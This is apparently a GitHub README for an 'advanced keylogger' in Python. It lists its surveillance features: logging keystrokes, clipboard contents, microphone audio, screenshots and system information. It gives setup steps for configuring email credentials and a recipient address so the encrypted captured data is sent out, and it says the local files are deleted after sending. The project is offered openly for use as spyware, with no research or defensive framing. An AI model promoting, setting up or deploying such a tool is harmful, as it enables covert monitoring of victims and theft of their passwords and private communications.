# Advanced Keylogger in Python

This project is an advanced keylogger implemented in Python. It captures keystrokes, system information, clipboard contents, audio recordings, and screenshots. The captured data is then sent to a specified email address and encrypted for security.

## Features

- Keystroke Logging: Captures all keystrokes and logs them into a file.
- System Information: Collects and logs information about the system.
- Clipboard Capture: Logs the current contents of the clipboard.
- Microphone Recording: Records audio for a specified duration.
- Screenshots: Captures and saves screenshots.
- Email Sending: Sends the captured data to a specified email address.
- Encryption: Encrypts the captured data before sending it via email.
- File Cleanup: Deletes the captured files after sending them.

## Setup
1. Install the required libraries:

    ```bash
    pip install pynput scipy sounddevice cryptography pillow pypiwin32 requests

2. Clone the repository:

    ```bash
    git clone https://github.com/IIIIIGODIIIII/Advanced_KeyLogger.git

3. Edit the configuration:
   Open the KeyLogger.ipynb file and update the following variables with your details:

    ```python
    email_address = "your_disposable_email@example.com"  # Enter disposable email here or use an API key for temp mail
    password = "your_email_password"  # Enter email password here (if using an API the no need)
    toaddr = "recipient_email@example.com"  # Enter the email address you want to send your information to
    key = "your_encryption_key"   # Generate an encryption key from the Cryptography folder
    file_path = "your_file_path"  # Enter the file path you want your files to be saved to

4. Generate an encryption key:
   Simpy execute the Generate_Key.py to generate an encryption key

## Usage
1. Simply execute all cells of the KeyLogger.ipynb file.
2. The keylogger will start capturing keystrokes, system information, clipboard contents, audio recordings, and screenshots. It will send the captured data to the specified email address after the specified time interval.

